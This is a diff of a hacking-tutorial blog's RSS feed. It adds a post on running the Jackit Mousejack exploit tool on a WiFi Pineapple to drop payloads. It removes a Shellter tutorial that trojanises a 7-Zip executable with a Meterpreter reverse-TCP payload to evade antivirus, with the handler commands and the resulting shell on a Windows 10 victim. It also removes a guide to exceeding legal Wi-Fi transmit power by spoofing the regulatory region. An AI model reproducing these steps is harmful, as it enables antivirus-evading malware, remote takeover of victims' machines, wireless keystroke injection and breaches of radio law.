@@ -2,9 +2,52 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
 <channel><title>metalkey</title><link>https://metalkey.github.io/index.html</link>
 <description>Hacking tutorials + info</description><language>en</language>
-<lastBuildDate>Mon, 04 Jun 2018 12:19:00 +1000</lastBuildDate>
-<pubDate>Mon, 04 Jun 2018 12:19:00 +1000</pubDate>
+<lastBuildDate>Fri, 15 Jun 2018 11:50:35 +1000</lastBuildDate>
+<pubDate>Fri, 15 Jun 2018 11:50:35 +1000</pubDate>
 <atom:link href="https://metalkey.github.io/feed.rss" rel="self" type="application/rss+xml" />
+<item><title>
+Mousejack on the WiFi Pineapple
+</title><description><![CDATA[
+
+<p>The Mousejack attack is extremely useful for dropping payloads on machines where vulnerable RF wireless devices are used and after a bit of trial and error, it was possible to get the Jackit exploit tool running on a WiFi Pineapple.<br>
+Commands to get things up and running below.<br>
+<br>
+<b>Note:</b> It is also possible to run Jackit on the Nano but it requires moving Python to an external SD card first.</p>
+
+<div class="code">
+root@pineapple:~$ <com>opkg update</com><br>
+root@pineapple:~$ <com>opkg install python-pip libusb-1.0 libusb-compat</com><br>
+root@pineapple:~$ <com>pip install pyusb click six tabulate</com><br>
+...<br>
+Download jackit from https://github.com/Sliim/jackit/tree/openwrt-libusb<br>
+Modify jackit as per master...Sliim:openwrt-libusb (e.g. wget https://raw.githubusercontent.com/Sliim/jackit/4de42c5d9cdae2ed1009b8cd161101e88ab1c76a/jackit/lib/nrf24.py)<br>
+...<br>
+root@pineapple:~$ <com>./setup.py build</com><br>
+root@pineapple:~$ <com>./setup.py install</com><br>
+</div>
+
+<p><b>Jackit Github Page:</b><br>
+<a href="https://github.com/insecurityofthings/jackit">https://github.com/insecurityofthings/jackit</a></p>
+
+<p>Tags: <a href='tag_wifi.html'>wifi</a></p>
+<!-- text end -->
+]]></description><link>https://metalkey.github.io/mousejack-on-the-wifi-pineapple.html</link>
+<guid>https://metalkey.github.io/./mousejack-on-the-wifi-pineapple.html</guid>
+<dc:creator></dc:creator>
+<pubDate>Fri, 15 Jun 2018 11:46:25 +1000</pubDate></item>
+<item><title>
+Title on this line
+</title><description><![CDATA[
+
+<p>The rest of the text file is an <b>html</b> blog post. The process will continue as soon
+as you exit your editor.</p>
+
+<p>Tags: <a href='tag_keep-this-tag-format.html'>keep-this-tag-format</a>, <a href='tag_tags-are-optional.html'>tags-are-optional</a>, <a href='tag_example.html'>example</a></p>
+<!-- text end -->
+]]></description><link>https://metalkey.github.io/title-on-this-line.html</link>
+<guid>https://metalkey.github.io/./title-on-this-line.html</guid>
+<dc:creator></dc:creator>
+<pubDate>Fri, 15 Jun 2018 11:34:58 +1000</pubDate></item>
 <item><title>
 Google Chrome Search Poison – Default Search Engine Exploit
 </title><description><![CDATA[
@@ -629,198 +672,4 @@ If your system is vulnerable, ensure it is patched immediately by upgrading your
 <guid>https://metalkey.github.io/./shellshock-explained--exploitation-tutorial.html</guid>
 <dc:creator>metalkey</dc:creator>
 <pubDate>Sat, 02 Jul 2016 18:01:02 +1000</pubDate></item>
-<item><title>
-Shellter – The ultimate tool for AV evasion
-</title><description><![CDATA[
-
-<p>Shellter Website - <a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a><br>
-<br>
-<strong>Attacker:</strong> Kali Linux<br>
-<strong>Victim:</strong> Windows 10 (fully patched, fully updated antivirus)</p>
-
-<h2>Introduction</h2>
-
-<p>Shellter is a tool for injecting dynamic shellcode into win32 exe’s. The shellcode can be yours, or something you generate via a 3rd party framework such as Metasploit.<br>
-Shellter preserves the original structure of the target executable and can be used in either Automatic or Manual mode. It can also be used to create encoded/self-decrypting payloads.<br>
-<br>
-In this tutorial, we will cover the automatic mode of operation.<br></p>
-
-<h2>Installation</h2>
-
-<p>You can either download and install Shellter from the Shellter Website or install using apt-get in Kali:
-<code></p>
-
-<div class="code">
-root@kali:~$ <com>apt-get update && apt-get install shellter</com>
-</div>
-
-<p></code></p>
-
-<h2>Payload Creation</h2>
-
-<p>Start shellter and select [A] for automatic mode, then select your target .exe file.
-<code></p>
-
-<div class="code">
-root@kali:~$ <com>shellter</com><br>
-Choose Operation Mode - Auto/Manual (A/M/H): <com>A</com><br>
-PE Target: <com>/root/Downloads/7-ZipPortable.exe</com>
-</div>
-
-<p></code>
-On the payload menu, select [L] then [1] for Meterpreter<em>Reverse</em>TCP.<br>
-Enter your IP address and port you wish to use the payload on.<br>
-Note: If you select Stealth Mode, you must set [exitfunc] to [thread] in Metasploit.
-<code></p>
-
-<div class="code">
-************<br>
-* Payloads *<br>
-************<br>
-<br>
-[1] Meterpreter_Reverse_TCP<br>
-[2] Meterpreter_Reverse_HTTP<br>
-[3] Meterpreter_Reverse_HTTPS<br>
-[4] Meterpreter_Bind_TCP<br>
-[5] Shell_Reverse_TCP<br>
-[6] Shell_Bind_TCP<br>
-[7] WinExec<br>
-<br>
-Use a listed payload or custom? (L/C/H): <com>L</com><br>
-Select payload by index: <com>1</com><br>
-SET LHOST: <com>192.168.1.162</com><br>
-SET LPORT: <com>4321</com>
-</div>
-
-<p></code>
-Shellter will now encode and obfuscate the payload.<br>
-When the process is complete, hit [Enter] to exit.<br>
-<br>
-At this point you can either use the checkvt script from Veil Evasion (<a href="https://www.veil-framework.com/how-to-safely-check-veil-payloads-against-virustotal/">https://www.veil-framework.com/how-to-safely-check-veil-payloads-against-virustotal/</a>) or Mubix’s vt-notify script (<a href="https://github.com/mubix/vt-notify">https://github.com/mubix/vt-notify</a>) to safely check the payload against Virus Total. Alternatively, use the virus scanner of your target system to confirm the payload is undetectable. DO NOT upload your exe to Virus Total.</p>
-
-<h2>Exploitation</h2>
-
-<p><code></p>
-
-<div class="code">
-root@kali:~$ <com>msfconsole</com><br>
-msf > <com>use exploit/multi/handler</com><br>
-msf exploit(handler) > <com>set payload windows/meterpreter/reverse_tcp</com><br>
-msf exploit(handler) > <com>set lhost 192.168.1.162</com><br>
-msf exploit(handler) > <com>set lport 4321</com><br>
-msf exploit(handler) > <com>exploit</com>
-</div>
-
-<p></code>
-Run the payload on your Victim machine
-<code></p>
-
-<div class="code">
-C:\7-ZipPortable><com>7-ZipPortable.exe</com>
-</div>
-
-<p></code>
-Back in Kali, a Meterpreter session will open and you now have a reverse shell to your victim Windows 10 machine.
-<code></p>
-
-<div class="code">
-[*] Meterpreter session 1 opened (192.168.1.162:4321 -> 192.168.1.11:49627) at 2015-10-05 00:39:33 +1100<br>
-<br>
-meterpreter > <com>shell</com><br>
-Process 3788 created.<br>
-Channel 1 created.<br>
-Microsoft Windows [Version 10.0.10240]<br>
-(c) 2015 Microsoft Corporation. All rights reserved.<br>
-<br>
-C:\7-ZipPortable> 
-</div>
-
-<p></code></p>
-
-<p>Tags: <a href='tag_av-evasion.html'>av-evasion</a></p>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<!-- text end -->
-]]></description><link>https://metalkey.github.io/shellter---the-ultimate-tool-for-av-evasion.html</link>
-<guid>https://metalkey.github.io/./shellter---the-ultimate-tool-for-av-evasion.html</guid>
-<dc:creator>metalkey</dc:creator>
-<pubDate>Fri, 01 Jul 2016 15:27:49 +1000</pubDate></item>
-<item><title>
-Increasing the Power Output of your Alfa AWUS036H
-</title><description><![CDATA[
-Warning: Check the laws in your region before adjusting the power output of your wifi adapter. Increasing the power above 20dBm can be a breach of regulations in some countries.</p>
-
-<p><strong>OS:</strong> Kali Linux</p>
-
-<h2>Checking the Current Power Output</h2>
-
-<p>In the example below Tx-Power is set to the default value of 20dBm for the current locale.<br>
-Information on how this value is determined is explained in-depth at Linux Wireless (<a href="http://linuxwireless.org/en/developers/Regulatory/">http://linuxwireless.org/en/developers/Regulatory/</a>)<br>
-<code></p>
-
-<div class="code">
-root@kali:~$ <com>iwconfig</com><br>
-<br>
-wlan0 IEEE 802.11bg ESSID:off/any<br>
-Mode:Managed Access Point: Not-Associated <com>Tx-Power=20 dBm</com><br>
-Retry short limit:7 RTS thr:off Fragment thr:off<br>
-Encryption key:off<br>
-Power Management:off<br>
-
-</div>
-
-<p></code></p>
-
-<h2>Increasing the Output to 1-Watt (30dBm)</h2>
-
-<p>To increase the power output of the Alfa AWUS036H to 1-Watt (manufacturer specified maximum) you will need to change your locale to a region with different regulations (e.g. Belize – BZ) and set txpower manually.
-<code></p>
-
-<div class="code">
-root@kali:~$ <com>ifconfig wlan0 down</com><br>
-root@kali:~$ <com>iw reg set BZ</com><br>
-root@kali:~$ <com>iwconfig wlan0 txpower 30</com><br>
-root@kali:~$ <com>ifconfig wlan0 up</com><br>
-root@kali:~$ <com>iwconfig</com><br>
-<br>
-wlan0 IEEE 802.11bg ESSID:off/any<br>
-Mode:Managed Access Point: Not-Associated <com>Tx-Power=30 dBm</com><br>
-Retry short limit:7 RTS thr:off Fragment thr:off<br>
-Encryption key:off<br>
-Power Management:off<br>
-
-</div>
-
-<p></code>
-We have successfully set txpower to 30dBM (1-Watt).<br>
-Higher values can also be set and detailed instructions are available at Null Byte (<a href="http://null-byte.wonderhowto.com/how-to/set-your-wi-fi-cards-tx-power-higher-than-30-dbm-0149606/">http://null-byte.wonderhowto.com/how-to/set-your-wi-fi-cards-tx-power-higher-than-30-dbm-0149606/</a>).</p>
-
-<p>Tags: <a href='tag_wifi.html'>wifi</a></p>
-
-
-
-
-
-
-
-<!-- text end -->
-]]></description><link>https://metalkey.github.io/increasing-the-power-output-of-your-alfa-awus036h.html</link>
-<guid>https://metalkey.github.io/./increasing-the-power-output-of-your-alfa-awus036h.html</guid>
-<dc:creator>metalkey</dc:creator>
-<pubDate>Fri, 01 Jul 2016 15:11:09 +1000</pubDate></item>
 </channel></rss>
